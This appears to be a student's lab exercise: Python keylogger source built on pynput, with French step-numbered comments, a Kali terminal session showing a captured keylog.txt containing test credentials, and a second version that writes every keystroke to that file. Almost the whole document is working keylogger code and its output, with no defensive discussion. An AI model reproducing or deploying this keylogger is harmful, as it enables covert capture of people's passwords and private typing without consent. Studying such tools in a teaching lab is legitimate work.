from pynput.keyboard import Listener, Key

log = ""

def processkeys(key):
    # 10.1 Déclaration d'une variable globale log
    global log
    try:
        # 10.3. Concaténer les caractères saisis (key.char)
        log += key.char
    except AttributeError:
        # 10.4. Gérer les touches spécifiques
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        elif key == Key.tab:
            log += "\t"
        elif key == Key.backspace:
            log = log[:-1]

        elif key == Key.esc:
            print("\nTouche échap pressée. Arrêt du programme.")
            # Afficher le contenu du log pour la vérification
            print("-" * 30)
            print("Contenu du Log Enregistré (représentation brute) :")
            print(repr(log))
            print("-" * 30)
            return False

        # 10.5. Traiter les autres touches spéciales avec log += ""
        elif key in (Key.up, Key.down, Key.left, Key.right, 
                     Key.shift, Key.ctrl, Key.alt, Key.cmd, Key.caps_lock):
            log += "" # 10.5 chaîne vide
            pass # L'utilisation de pass est plus claire ici
        else:
            # Pour autre touche spéciale non listée :
            log += "" # 10.5 chaîne vide


with Listener(on_press=processkeys) as keyboard_listener:
    print("Keylogger lancé.")
    keyboard_listener.join()
                                                                                                                                                                                                                                           
┌──(camille㉿kali)-[~/Desktop]
└─$ cat keylog.txt              
Mon mot de passe myefrei est admin/admin.
Mon mot de passe ultra secret est root/root.cam
spspjsopjspjsnpsohiopsnsnops
spsj^osjs
sposhposjopsjpsojsnposbosbo                                                                                                                                                                                                                                           
┌──(camille㉿kali)-[~/Desktop]
└─$ cat test.py                 
import os
import threading
from pynput.keyboard import Listener, Key

# 11.2. Déclarer une autre variable globale path
path = os.path.join(os.getcwd(), "keylog.txt")

log = ""

def processkeys(key):
    global log
    try:
        log += key.char
    except AttributeError:
        # 10.4. Gérer les touches spécifiques
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        elif key == Key.tab:
            log += "\t"
        elif key == Key.backspace:
            log = log[:-1]
            pass
        elif key == Key.esc:
            print("\nTouche échap pressée. Arrêt du programme.")
            report() # Sauvegarde finale avant l'arrêt
            return False
        # 10.5. Traiter explicitement les autres touches spéciales avec log += ""
        elif key in (Key.up, Key.down, Key.left, Key.right,
                     Key.shift, Key.ctrl, Key.alt, Key.cmd, Key.caps_lock):
            log += ""
        else:
            log += ""

# 11.3. Déclarer une fonction report()
def report():
    # 11.3.1. Déclarer les deux variables globales log et path
    global log, path
    # 11.3.2. Créer une variable logfile = open(path, “a”)
    try:
        logfile = open(path, "a", encoding="utf-8")
        logfile.write(log)
        # Réinitialiser le log après la sauvegarde pour éviter la redondance
        log = ""
    except Exception as e:
        # Gestion simple des erreurs d'accès ou d'écriture du fichier
        print(f"\nErreur lors de l'écriture du fichier log: {e}")
    # 11.3.5. Rajouter l’instruction logfile.close()
    finally:
        if 'logfile' in locals() and not logfile.closed:
            logfile.close()


with Listener(on_press=processkeys) as keyboard_listener:
    print("Keylogger lancé.")
    report()
    keyboard_listener.join()
